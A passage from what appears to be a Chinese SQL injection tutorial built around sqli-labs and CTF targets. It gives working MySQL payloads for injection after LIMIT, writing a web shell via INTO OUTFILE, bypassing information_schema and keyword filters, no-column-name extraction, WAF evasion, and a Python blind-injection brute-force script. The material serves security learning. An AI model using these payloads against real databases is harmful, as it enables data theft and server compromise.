class="number">5</span>))</span><br></pre></td></tr></table></figure></div></li></ul><h3 id="procedure-analyse-参数后注入"><a href="#procedure-analyse-参数后注入" class="headerlink" title="procedure analyse 参数后注入"></a>procedure analyse 参数后注入</h3><p>此方法适用于MySQL 5.x中，在limit语句后面的注入 利用procedure analyse 参数，我们可以执行报错注入。</p><p>同时，在procedure analyse 和order by 之间可以存在limit 参数，我们在实际应用中，往往也可能会存在limit 后的注入，可以利用procedure analyse 进行注入</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-46</span><span class="operator">/</span>?sort<span class="operator">=</span><span class="number">1</span>  <span class="keyword">procedure</span> analyse(extractvalue(rand(),con</span><br><span class="line">cat(<span class="number">0x3a</span>,version())),<span class="number">1</span>)</span><br><span class="line"><span class="keyword">SELECT</span> field <span class="keyword">FROM</span> <span class="keyword">user</span> <span class="keyword">WHERE</span> id <span class="operator">&gt;</span><span class="number">0</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> id LIMIT <span class="number">1</span>,<span class="number">1</span> <span class="keyword">procedure</span> analyse(extractvalue(rand(),concat(<span class="number">0x3a</span>,version())),<span class="number">1</span>); </span><br><span class="line"># 如果不支持报错注入的话，还可以基于时间注入：</span><br><span class="line"><span class="keyword">SELECT</span> field <span class="keyword">FROM</span> <span class="keyword">table</span> <span class="keyword">WHERE</span> id <span class="operator">&gt;</span> <span class="number">0</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> id LIMIT <span class="number">1</span>,<span class="number">1</span> <span class="keyword">PROCEDURE</span> analyse((<span class="keyword">select</span> extractvalue(rand(),concat(<span class="number">0x3a</span>,(IF(MID(version(),<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">LIKE</span> <span class="number">5</span>, BENCHMARK(<span class="number">5000000</span>,SHA1(<span class="number">1</span>)),<span class="number">1</span>))))),<span class="number">1</span>)</span><br></pre></td></tr></table></figure></div><h3 id="导入导出文件into-outfile-参数"><a href="#导入导出文件into-outfile-参数" class="headerlink" title="导入导出文件into outfile 参数"></a>导入导出文件into outfile 参数</h3><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-46</span><span class="operator">/</span>?sort<span class="operator">=</span><span class="number">1</span> <span class="keyword">into</span> outfile &quot;c:\\wamp\\www\\sqllib\\test</span><br><span class="line">1.txt&quot;</span><br><span class="line"># 将查询结果导入到文件当中</span><br><span class="line"># 那这个时候我们可以考虑上传网马，利用lines terminated <span class="keyword">by</span></span><br><span class="line"><span class="keyword">Into</span> outtfile c:\\wamp\\www\\sqllib\\test1.txt lines terminated <span class="keyword">by</span> <span class="number">0</span>x(网马进行<span class="number">16</span> 进制转</span><br><span class="line">换)</span><br></pre></td></tr></table></figure></div><h2 id="六、常见bypass"><a href="#六、常见bypass" class="headerlink" title="六、常见bypass"></a>六、常见bypass</h2><p><a class="link"   href="http://byd.dropsec.xyz/2016/08/01/SQL-Injection%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/" >SQL注入绕过技巧 | 瓦都剋 (dropsec.xyz) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h3 id="Information-schema被屏蔽或过滤or时"><a href="#Information-schema被屏蔽或过滤or时" class="headerlink" title="Information_schema被屏蔽或过滤or时"></a>Information_schema被屏蔽或过滤or时</h3><p><a class="link"   href="https://www.anquanke.com/post/id/193512" >聊一聊bypass information_schema - 安全客，安全资讯平台 (anquanke.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h4 id="MySQL5-7的新特性"><a href="#MySQL5-7的新特性" class="headerlink" title="MySQL5.7的新特性"></a>MySQL5.7的新特性</h4><blockquote><p>由于performance_schema过于发杂，所以mysql在5.7版本中新增了sys schemma，基础数据来自于performance_chema和information_schema两个库，本身数据库不存储数据。</p></blockquote><h4 id="innodb表–查找当前数据库的现存表"><a href="#innodb表–查找当前数据库的现存表" class="headerlink" title="innodb表–查找当前数据库的现存表"></a><strong>innodb表</strong>–查找当前数据库的现存表</h4><p>MySQL 5.6 及以上版本存在innodb_index_stats，innodb_table_stats两张表，其中包含新建立的库和表</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> mysql.innodb_table_stats <span class="keyword">where</span> database_name <span class="operator">=</span> database(); # 返回去重过后的表名(简洁)</span><br><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> mysql.innodb_index_stats <span class="keyword">where</span> database_name <span class="operator">=</span> database(); # 返回值中会出现重复的表名</span><br></pre></td></tr></table></figure></div><h4 id="sys表"><a href="#sys表" class="headerlink" title="sys表"></a>sys表</h4><p>在MySQL 5.7.9中sys中新增了一些视图，可以从中获取表名</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#包含<span class="keyword">in</span></span><br><span class="line"><span class="keyword">SELECT</span> object_name <span class="keyword">FROM</span> `sys`.`x$innodb_buffer_stats_by_table` <span class="keyword">where</span> object_schema <span class="operator">=</span> database();</span><br><span class="line"><span class="keyword">SELECT</span> object_name <span class="keyword">FROM</span> `sys`.`innodb_buffer_stats_by_table` <span class="keyword">WHERE</span> object_schema <span class="operator">=</span> DATABASE();</span><br><span class="line"><span class="keyword">SELECT</span> TABLE_NAME <span class="keyword">FROM</span> `sys`.`x$schema_index_statistics` <span class="keyword">WHERE</span> TABLE_SCHEMA <span class="operator">=</span> DATABASE();</span><br><span class="line"><span class="keyword">SELECT</span> TABLE_NAME <span class="keyword">FROM</span> `sys`.`schema_auto_increment_columns` <span class="keyword">WHERE</span> TABLE_SCHEMA <span class="operator">=</span> DATABASE();</span><br><span class="line"><span class="keyword">SELECT</span> table_schema <span class="keyword">FROM</span> sys.schema_table_statistics <span class="keyword">GROUP</span> <span class="keyword">BY</span> table_schema;</span><br><span class="line">#不包含<span class="keyword">in</span></span><br><span class="line"><span class="keyword">SELECT</span> TABLE_NAME <span class="keyword">FROM</span> `sys`.`x$schema_flattened_keys` <span class="keyword">WHERE</span> TABLE_SCHEMA <span class="operator">=</span> DATABASE();</span><br><span class="line"><span class="keyword">SELECT</span> TABLE_NAME <span class="keyword">FROM</span> `sys`.`x$ps_schema_table_statistics_io` <span class="keyword">WHERE</span> TABLE_SCHEMA <span class="operator">=</span> DATABASE();</span><br><span class="line"><span class="keyword">SELECT</span> TABLE_NAME <span class="keyword">FROM</span> `sys`.`x$schema_table_statistics_with_buffer` <span class="keyword">WHERE</span> TABLE_SCHEMA <span class="operator">=</span> DATABASE();</span><br><span class="line"><span class="keyword">SELECT</span> table_schema <span class="keyword">FROM</span> sys.x$schema_flattened_keys <span class="keyword">GROUP</span> <span class="keyword">BY</span> table_schema;</span><br><span class="line">#通过表文件的存储路径获取表名</span><br><span class="line"><span class="keyword">SELECT</span> FILE <span class="keyword">FROM</span> `sys`.`io_global_by_file_by_bytes` <span class="keyword">WHERE</span> FILE REGEXP DATABASE();</span><br><span class="line"><span class="keyword">SELECT</span> FILE <span class="keyword">FROM</span> `sys`.`io_global_by_file_by_latency` <span class="keyword">WHERE</span> FILE REGEXP DATABASE();</span><br><span class="line"><span class="keyword">SELECT</span> FILE <span class="keyword">FROM</span> `sys`.`x$io_global_by_file_by_bytes` <span class="keyword">WHERE</span> FILE REGEXP DATABASE();</span><br><span class="line"></span><br><span class="line">#查询指定库的表（若无则说明此表从未被访问）</span><br><span class="line"><span class="keyword">SELECT</span> table_name <span class="keyword">FROM</span> sys.schema_table_statistics <span class="keyword">WHERE</span> table_schema<span class="operator">=</span><span class="string">&#x27;mspwd&#x27;</span> <span class="keyword">GROUP</span> <span class="keyword">BY</span> table_name;</span><br><span class="line"><span class="keyword">SELECT</span> table_name <span class="keyword">FROM</span> sys.x$schema_flattened_keys <span class="keyword">WHERE</span> table_schema<span class="operator">=</span><span class="string">&#x27;mspwd&#x27;</span> <span class="keyword">GROUP</span> <span class="keyword">BY</span> table_name;</span><br><span class="line">#统计所有访问过的表次数:库名,表名,访问次数</span><br><span class="line"><span class="keyword">select</span> table_schema,table_name,<span class="built_in">sum</span>(io_read_requests<span class="operator">+</span>io_write_requests) io <span class="keyword">from</span> sys.schema_table_statistics <span class="keyword">group</span> <span class="keyword">by</span></span><br><span class="line">table_schema,table_name <span class="keyword">order</span> <span class="keyword">by</span> io <span class="keyword">desc</span>;</span><br><span class="line">#查看所有正在连接的用户详细信息</span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">user</span>,db,command,current_statement,last_statement,<span class="type">time</span> <span class="keyword">FROM</span> sys.session;</span><br><span class="line">#查看所有曾连接数据库的IP,总连接次数</span><br><span class="line"><span class="keyword">SELECT</span> host,total_connections <span class="keyword">FROM</span> sys.host_summary;</span><br><span class="line"># 包含之前查询记录的表</span><br><span class="line"><span class="keyword">SELECT</span> QUERY <span class="keyword">FROM</span> sys.x$statement_analysis <span class="keyword">WHERE</span> QUERY REGEXP DATABASE();</span><br><span class="line"><span class="keyword">SELECT</span> QUERY <span class="keyword">FROM</span> `sys`.`statement_analysis` <span class="keyword">where</span> QUERY REGEXP DATABASE();</span><br></pre></td></tr></table></figure></div><h4 id="performance-schema表"><a href="#performance-schema表" class="headerlink" title="performance_schema表"></a>performance_schema表</h4><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> object_name <span class="keyword">FROM</span> `performance_schema`.`objects_summary_global_by_type` <span class="keyword">WHERE</span> object_schema <span class="operator">=</span> DATABASE();</span><br><span class="line"><span class="keyword">SELECT</span> object_name <span class="keyword">FROM</span> `performance_schema`.`table_handles` <span class="keyword">WHERE</span> object_schema <span class="operator">=</span> DATABASE();</span><br><span class="line"><span class="keyword">SELECT</span> object_name <span class="keyword">FROM</span> `performance_schema`.`table_io_waits_summary_by_index_usage` <span class="keyword">WHERE</span> object_schema <span class="operator">=</span> DATABASE();</span><br><span class="line"><span class="keyword">SELECT</span> object_name <span class="keyword">FROM</span> `performance_schema`.`table_io_waits_summary_by_table` <span class="keyword">WHERE</span> object_schema <span class="operator">=</span> DATABASE();</span><br><span class="line"><span class="keyword">SELECT</span> object_name <span class="keyword">FROM</span> `performance_schema`.`table_lock_waits_summary_by_table` <span class="keyword">WHERE</span> object_schema <span class="operator">=</span> DATABASE();</span><br><span class="line">#包含之前查询记录的表</span><br><span class="line"><span class="keyword">SELECT</span> digest_text <span class="keyword">FROM</span> `performance_schema`.`events_statements_summary_by_digest` <span class="keyword">WHERE</span> digest_text REGEXP DATABASE();</span><br><span class="line">#包含表文件路径的表</span><br><span class="line"><span class="keyword">SELECT</span> file_name <span class="keyword">FROM</span> `performance_schema`.`file_instances` <span class="keyword">WHERE</span> file_name REGEXP DATABASE();</span><br></pre></td></tr></table></figure></div><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032232923.jpg"                      alt="image-20220707221836224"                ><figcaption>image-20220707221836224</figcaption></figure></p><blockquote><p>上诉表格中虽然有能够查列名的表，但是查出来的数据都不全，当知道flag所在的库和表名时，但无法获取到列名，就需要利用无列名盲注了</p></blockquote><h4 id="join无列名注入-payload"><a href="#join无列名注入-payload" class="headerlink" title="join无列名注入 payload"></a>join无列名注入 payload</h4><p><strong>join … using(xx)</strong></p><p>查表名</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name)<span class="keyword">from</span> sys.schema_auto_increment_columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database()<span class="comment">--+</span></span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name)<span class="keyword">from</span> sys.schema_table_statistics_with_buffer <span class="keyword">where</span> table_schema<span class="operator">=</span>database()<span class="comment">--+</span></span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> mysql.innodb_table_stats <span class="keyword">where</span> database_name<span class="operator">=</span>database()<span class="comment">--+</span></span><br></pre></td></tr></table></figure></div><blockquote><p>Union all 与union 的区别是增加了去重的功能</p></blockquote><p>查列名(适用于逗号被过滤)</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># <span class="keyword">union</span> <span class="keyword">select</span> 重命名法</span><br><span class="line"><span class="keyword">select</span> c <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">as</span> a, <span class="number">1</span> <span class="keyword">as</span> b, <span class="number">1</span> <span class="keyword">as</span> c <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test)x limit <span class="number">1</span> <span class="keyword">offset</span> <span class="number">1</span>;</span><br><span class="line">#无逗号，有<span class="keyword">join</span>版本</span><br><span class="line"><span class="keyword">select</span> a <span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span> `a`)m <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">2</span> `b`)n <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">3</span> `c`)t <span class="keyword">where</span> <span class="number">0</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test)x;</span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span><span class="operator">*</span><span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">as</span> a <span class="keyword">join</span> users b)c<span class="comment">--+</span></span><br><span class="line"># 获取第一列的列名</span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span><span class="operator">*</span><span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">as</span> a <span class="keyword">join</span> users b <span class="keyword">using</span>(id,username))c<span class="comment">--+</span></span><br><span class="line"># 获取次列及后续列名</span><br></pre></td></tr></table></figure></div><h4 id="union-select重命名法"><a href="#union-select重命名法" class="headerlink" title="union select重命名法"></a><code>union select重命名法</code></h4><p>不获取列名情况下查列,以查第二列为例</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(b) <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span> <span class="keyword">as</span> b,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users)a;</span><br><span class="line"># 也可以查多个列</span><br><span class="line"><span class="keyword">select</span> concat(`<span class="number">2</span>`,<span class="number">0x2d</span>,`<span class="number">3</span>`) <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> admin)a limit <span class="number">1</span>,<span class="number">3</span>;</span><br><span class="line"># <span class="number">0x2d</span>会转换成字符<span class="string">&#x27;-&#x27;</span></span><br></pre></td></tr></table></figure></div><blockquote><p>这里将第二列取别名为b(如果反引号&#96;没被过滤，可以不取别名，直接用⬇️)</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> `<span class="number">2</span>` <span class="keyword">from</span> ……</span><br></pre></td></tr></table></figure></div><p>结尾的a可以替换成任意字符，这是用来命名的</p><p>原理是联合查询时列名显示的是前一个select的结果，这里第一个select是<code>select 1,2 as b,3 </code>将列名重命名为1 b 3，然后再将这个新表命名为a，再进行查询</p></blockquote><h3 id="select被过滤"><a href="#select被过滤" class="headerlink" title="select被过滤"></a>select被过滤</h3><p><a class="link"   href="https://www.freebuf.com/articles/web/275528.html" >基于mysql8特性的sql注入 - FreeBuf网络安全行业门户 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>mysql 8.0.19<code>新增语句</code>table </p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">table</span> users; <span class="operator">=</span><span class="operator">=</span><span class="operator">=</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users;</span><br></pre></td></tr></table></figure></div><blockquote><p>table不能加where子句，不允许行过滤，显示所有列，但可以用来盲注表名</p></blockquote><h4 id="table盲注脚本"><a href="#table盲注脚本" class="headerlink" title="table盲注脚本"></a>table盲注脚本</h4><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment">#orio1e</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">str2hex</span>(<span class="params"><span class="built_in">str</span></span>):</span><br><span class="line">result=<span class="string">&#x27;0x&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">result+=<span class="built_in">hex</span>(<span class="built_in">ord</span>(i))[<span class="number">2</span>:]</span><br><span class="line"><span class="keyword">return</span> result</span><br><span class="line">dic=[<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;v&#x27;</span>,</span><br><span class="line">         <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;z&#x27;</span>,]  <span class="comment"># 字典</span></span><br><span class="line">result=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">35</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(dic)):</span><br><span class="line"><span class="built_in">print</span>(dic[j])</span><br><span class="line">url=<span class="string">&quot;http://127.0.0.1:8010&quot;</span></span><br><span class="line"><span class="comment">#第一个字段</span></span><br><span class="line"><span class="comment">#结果:1</span></span><br><span class="line">payload=&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;asd\\&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;||(&#123;&#125;,0x21,0x21)&lt;(table/**/admin_user/**/limit/**/1)#&quot;</span>.<span class="built_in">format</span>(str2hex(result+dic[j]))&#125;</span><br><span class="line"><span class="comment">#爆第二个字段</span></span><br><span class="line"><span class="comment">#结果:guest</span></span><br><span class="line">payload=&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;asd\\&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;||(0x31,&#123;&#125;,0x21)&lt;(table/**/admin_user/**/limit/**/1)#&quot;</span>.<span class="built_in">format</span>(str2hex(result+dic[j]))&#125;</span><br><span class="line"><span class="comment">#爆第三个字段</span></span><br><span class="line"><span class="comment">#结果:123456</span></span><br><span class="line"><span class="comment">#因为最后一个字符完成后长度相等又判断为假 所以最后一个字符应为其下一个字母</span></span><br><span class="line"><span class="comment">#但是这仅限最后一个字段</span></span><br><span class="line"><span class="comment">#所以正确结果是we1c0mehacker </span></span><br><span class="line">payload=&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;asd\\&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;||(0x31,0x61646d696e,&#123;&#125;)&lt;(table/**/users/**/limit/**/1)#&quot;</span>.<span class="built_in">format</span>(str2hex(result+dic[j]))&#125;</span><br><span class="line"></span><br><span class="line">res=requests.post(url=url,data=payload)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"><span class="built_in">print</span>(res.text[-<span class="number">20</span>:])</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;emmmmm&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">elif</span> <span class="string">&quot;no&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line"><span class="comment">#返回假时表示上一个字母即为正确结果</span></span><br><span class="line">result+=dic[j-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure></div><blockquote><p>注意往前回溯</p><p>mysql比较，从第一个字符还是比较ascii的大小，一次往后 ,并且多列的比较时从第一列的第一位开始的</p><p>mysql中对char型大小写是不敏感的，盲注的时候要么可以使用hex或者binary。</p></blockquote><h4 id="values注入"><a href="#values注入" class="headerlink" title="values注入"></a>values注入</h4><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> `test`.`log`(`log`) <span class="keyword">VALUES</span>(<span class="string">&#x27;$log&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> `test`.`log`(`log`) <span class="keyword">VALUES</span>(<span class="string">&#x27;testsetset&#x27;</span><span class="keyword">or</span> sleep(<span class="number">5</span>)) # <span class="string">&#x27;);</span></span><br><span class="line"><span class="string">insert into `test`.`log`(`log`) VALUES(&#x27;</span>testsetset<span class="string">&#x27; and extractvalue(1,concat(0x7e,(select @@version),0x7e))) # &#x27;</span>)</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> `test`.`log`(`log`) <span class="keyword">VALUES</span>(<span class="string">&#x27;1&#x27;</span><span class="operator">+</span>if((<span class="number">1</span><span class="operator">=</span><span class="number">1</span>),sleep(<span class="number">2</span>),<span class="number">1</span>)) # <span class="string">&#x27;)</span></span><br></pre></td></tr></table></figure></div><p>可以利用联合注入代替order by</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032232669.jpg"                      alt="image-20220707223820177"                ><figcaption>image-20220707223820177</figcaption></figure></p><h3 id="WAF绕过–服务器解析漏洞"><a href="#WAF绕过–服务器解析漏洞" class="headerlink" title="WAF绕过–服务器解析漏洞"></a>WAF绕过–服务器解析漏洞</h3><p>index.php?id&#x3D;1&amp;id&#x3D;2</p><blockquote><p>apache（php）解析最后一个参数，即显示id&#x3D;2 的内容。Tomcat（jsp）解析第一个参数，即显示id&#x3D;1 的内容。</p><p>我们往往在tomcat 服务器处做数据过滤和处理，功能类似为一个WAF，因此可以传入第一个为合法参数，第二个采用注入</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032232308.jpg"                      alt="image-20220708192908674"                ><figcaption>image-20220708192908674</figcaption></figure></p></blockquote><h3 id="空格被过滤"><a href="#空格被过滤" class="headerlink" title="空格被过滤"></a>空格被过滤</h3><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/**/替代空格</span><br><span class="line"><span class="meta prompt_">%</span><span class="language-bash">09 TAB 键（水平）</span></span><br><span class="line"><span class="meta prompt_">%</span><span class="language-bash">0a 新建一行</span></span><br><span class="line"><span class="meta prompt_">%</span><span class="language-bash">0c 新的一页</span></span><br><span class="line"><span class="meta prompt_">%</span><span class="language-bash">0d <span class="built_in">return</span> 功能</span></span><br><span class="line"><span class="meta prompt_">%</span><span class="language-bash">0b TAB 键（垂直）</span></span><br><span class="line"><span class="meta prompt_">%</span><span class="language-bash">a0 空格</span></span><br><span class="line">() 代替空格，在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。</span><br></pre></td></tr></table></figure></div><blockquote><p>%a0是一个不成汉字的中文字符，因此正则匹配时不会当空格过滤，而进入sql语句后，mysql不认中文字符，当空格处理</p></blockquote><h3 id="过滤单引号"><a href="#过滤单引号" class="headerlink" title="过滤单引号"></a>过滤单引号</h3><p>转义符号及注释没被过滤时，将username闭合的单引号转义，在password的输入中插入布尔盲注语句</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span>admin\</span><br><span class="line">password<span class="operator">=</span><span class="keyword">or</span> <span class="number">2</span><span class="operator">&gt;</span><span 